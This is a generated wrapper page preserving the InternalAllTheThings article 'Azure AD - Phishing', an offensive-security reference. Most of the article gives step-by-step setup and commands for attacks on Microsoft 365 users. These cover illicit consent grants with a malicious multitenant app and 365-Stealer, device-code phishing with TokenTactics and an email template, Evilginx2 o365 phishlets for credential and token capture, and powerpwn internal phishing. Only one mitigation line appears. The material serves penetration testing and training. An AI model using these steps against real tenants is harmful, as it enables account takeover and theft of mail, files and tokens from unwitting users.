---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Azure AD - Phishing

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cloud-azure-azure-phishing` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-phishing.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Azure AD - Phishing](../../topics/cloud/azure-ad-phishing.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-cloud-azure-azure-phishing |
| name | Azure AD - Phishing |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cloud/azure/azure-phishing.md |

## Preserved Source Material

````yaml
_body: "# Azure AD - Phishing\n\n## Illicit Consent Grant\n\n> The attacker creates an Azure-registered application that requests\
  \ access to data such as contact information, email, or documents. The attacker then tricks an end user into granting consent\
  \ to the application so that the attacker can gain access to the data that the target user has access to.\n\n:warning: All\
  \ Office 365 users will be protected from app-based attacks now that publisher verification is generally available as they\
  \ \"will no longer be able to consent to new multi-tenant apps registered after November 8th, 2020 coming from unverified\
  \ publishers\".\n\nCheck if users are allowed to consent to apps: `PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole`\n\
  \n* **Disable user consent** : Users cannot grant permissions to applications.\n* **Users can consent to apps from verified\
  \ publishers or your organization, but only for permissions you select** : All users can only consent to apps that were\
  \ published by a verified publisher and apps that are registered in your tenant\n* **Users can consent to all apps** : allows\
  \ all users to consent to any permission which doesn't require admin consent.\n* **Custom app consent policy**\n\n### Register\
  \ Application\n\n1. Login to [https://portal.azure.com](https://portal.azure.com) > Azure Active Directory\n2. Click on\
  \ **App registrations** > **New registration**\n3. Enter the Name for our application\n4. Under support account types select\
  \ **\"Accounts in any organizational directory (Any Azure AD directory - Multitenant)\"**\n5. Enter the Redirect URL. This\
  \ URL should be pointed towards our 365-Stealer application that we will host for hosting our phishing page. Make sure the\
  \ endpoint is `https://<DOMAIN/IP>:<PORT>/login/authorized`.\n6. Click **Register** and save the **Application ID**\n\n\
  ### Configure Application\n\n1. Click on `Certificates & secrets`\n2. Click on `New client secret` then enter the **Description**\
  \ and click on **Add**.\n3. Save the **secret**'s value.\n4. Click on API permissions > Add a permission\n5. Click on Microsoft\
  \ Graph > **Delegated permissions**\n6. Search and select the below mentioned permissions and click on Add permission\n\
  \    * Contacts.Read\n    * Mail.Read / Mail.ReadWrite\n    * Mail.ReadBasic\n    * Mail.Send\n    * Notes.Read.All\n  \
  \  * Mailboxsettings.ReadWrite\n    * Files.ReadWrite.All\n    * User.ReadBasic.All\n    * User.Read\n\n### Setup 365-Stealer\
  \ (Deprecated)\n\n:warning: Default port for 365-Stealer phishing is 443\n\n* Run XAMPP and start Apache\n* Clone 365-Stealer\
  \ into `C:\\xampp\\htdocs\\`\n    * `git clone https://github.com/AlteredSecurity/365-Stealer.git`\n* Install the requirements\n\
  \    * Python3\n    * PHP CLI or Xampp server\n    * `pip install -r requirements.txt`\n* Enable sqlite3 (Xampp > Apache\
  \ config > php.ini) and restart Apache\n* Edit `C:/xampp/htdocs/yourvictims/index.php` if needed\n    * Disable IP whitelisting\
  \ `$enableIpWhiteList = false;`\n* Go to 365-Stealer Management portal > Configuration (`http://localhost:82/365-stealer/yourVictims`)\n\
  \    * **Client Id** (Mandatory): This will be the Application(Client) Id of the application that we registered.\n    *\
  \ **Client Secret** (Mandatory): Secret value from the Certificates & secrets tab that we created.\n    * **Redirect URL**\
  \ (Mandatory): Specify the redirect URL that we entered during registering the App like `https://<Domain/IP>/login/authorized`\n\
  \    * **Macros Location**: Path of macro file that we want to inject.\n    * **Extension in OneDrive**: We can provide\
  \ file extensions that we want to download from the victims account or provide `*` to download all the files present in\
  \ the victims OneDrive. The file extensions should be comma separated like txt, pdf, docx etc.\n    * **Delay**: Delay the\
  \ request by specifying time in seconds while stealing\n* Create a Self Signed Certificate to use HTTPS\n* Run the application\
  \ either click on the button or run this command : `python 365-Stealer.py --run-app`\n    * `--no-ssl`: disable HTTPS\n\
  \    * `--port`: change the default listening port\n    * `--token`: provide a specific token\n    * `--refresh-token XXX\
  \ --client-id YYY --client-secret ZZZ`: use a refresh token\n* Find the Phishing URL: go to `https://<IP/Domain>:<Port>`\
  \ and click on **Read More** button or in the console.\n\n### Vajra\n\n> Vajra is a UI-based tool with multiple techniques\
  \ for attacking and enumerating in the target's Azure environment. It features an intuitive web-based user interface built\
  \ with the Python Flask module for a better user experience. The primary focus of this tool is to have different attacking\
  \ techniques all at one place with web UI interfaces. - [TROUBLE-1/Vajra](https://github.com/TROUBLE-1/Vajra)\n\n**Mitigation**:\
  \ Enable `Do not allow user consent` for applications in the \"Consent and permissions menu\".\n\n### Roadtx\n\n* Use the\
  \ authorization code flow in `roadtx` to get token\n\n```ps1\nroadtx codeauth -c <app-id> -r msgraph -t <tenant-id> <0.A....>\
  \ -ru 'https://<phish-app>/redir' -p <app-secret>\n```\n\n## Device Code Phishing\n\n* Using roadtool: `roadtx gettokens\
  \ -u user@domain.lab --device-code`\n\n    ```ps1\n    roadtx.exe auth --device-code -c 29d9ed98-a469-4536-ade2-f981bc1d605e\n\
  \    Requesting token for resource https://graph.windows.net\n    To sign in, use a web browser to open the page https://microsoft.com/devicelogin\
  \ and enter the code XXXXXXXXX to authenticate.\n    ```\n\n* Using TokenTactics to request a token for Azure Graph API\
  \ using a device code\n\n    ```ps1\n    Import-Module .\\TokenTactics.psd1\n    Get-AzureToken -Client Graph\n    ```\n\
  \n* Replace `<REPLACE-WITH-DEVCODE-FROM-TOKENTACTICS>` in the [phishing email](https://github.com/rvrsh3ll/TokenTactics/blob/main/resources/DeviceCodePhishingEmailTemplate.oft)\n\
  * Leave TokenTactics running in the PowerShell window and send the phishing email\n* Targeted user will follow the link\
  \ to [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) and complete the Device Code form\n* Enjoy your\
  \ **access token** and **refresh token**\n\n## Phishing with Evilginx2\n\n* Run [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2)\
  \ with o365 phishlet\n\n    ```powershell\n    PS C:\\Tools> evilginx2 -p C:\\Tools\\evilginx2\\phishlets\n    : config\
  \ domain username.corp\n    : config ip 10.10.10.10\n    : phishlets hostname o365 login.username.corp\n    : phishlets\
  \ get-hosts o365\n    ```\n\n* Create a DNS entry type A for `login.login.username.corp` and `www.login.username.corp`,\
  \ pointing to your machine\n* Copy certificate and enable the phishing\n\n    ```ps1\n    PS C:\\Tools> Copy-Item C:\\Users\\\
  Username\\.evilginx\\crt\\ca.crt C:\\Users\\Username\\.evilginx\\crt\\login.username.corp\\o365.crt\n    PS C:\\Tools> Copy-Item\
  \ C:\\Users\\Username\\.evilginx\\crt\\private.key C:\\Users\\Username\\.evilginx\\crt\\login.username.corp\\o365.key\n\
  \    : phishlets enable o365\n\n    # get the phishing URL\n    : lures create o365\n    : lures get-url 0\n    ```\n\n\
  ### Internal Phishing - Power Platform\n\n> Set up an internal phishing application on a Microsoft-owned domains which will\
  \ automatically authenticate as users browse to your link.\n\n* Install [mbrg/power-pwn](https://github.com/mbrg/power-pwn)\
  \ - An offensive and defensive security toolset for Microsoft 365 Power Platform\n\n    ```ps1\n    pip install powerpwn\n\
  \    ```\n\n* Install the application: `powerpwn phishing install-app -t {tenant-id} -e {environment-id} --input {path to\
  \ application package zip} -n {application name}`\n* Share application with org: `powerpwn phishing share-app -t {tenant-id}\
  \ -e {environment-id} -a {app id}`\n\n## References\n\n* [Introduction To 365-Stealer - Understanding and Executing the\
  \ Illicit Consent Grant Attack](https://www.alteredsecurity.com/post/introduction-to-365-stealer)\n* [Learn with @trouble1_raunak:\
  \ Cloud Pentesting - Azure (Illicit Consent Grant Attack) - trouble1_raunak - Jun 6, 2021](https://www.youtube.com/watch?v=51FSvndgddk&list=WL)\n\
  * [The Art of the Device Code Phish - Bobby Cooke - July 12, 2021](https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html)\n\
  * [Power Pwn - Black Hat Arsenal 2023 - Aug 24, 2023](https://www.youtube.com/watch?v=LpdckZyBwvs)\n* [Low Code High Risk\
  \ - Enterprise Domination via Low Code Abuse - Defcon 30 - Oct 20, 2022](https://www.youtube.com/watch?v=D3A62Rzozq4)\n\
  * [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)"
_relative_path: cloud/azure/azure-phishing.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-phishing.md
````
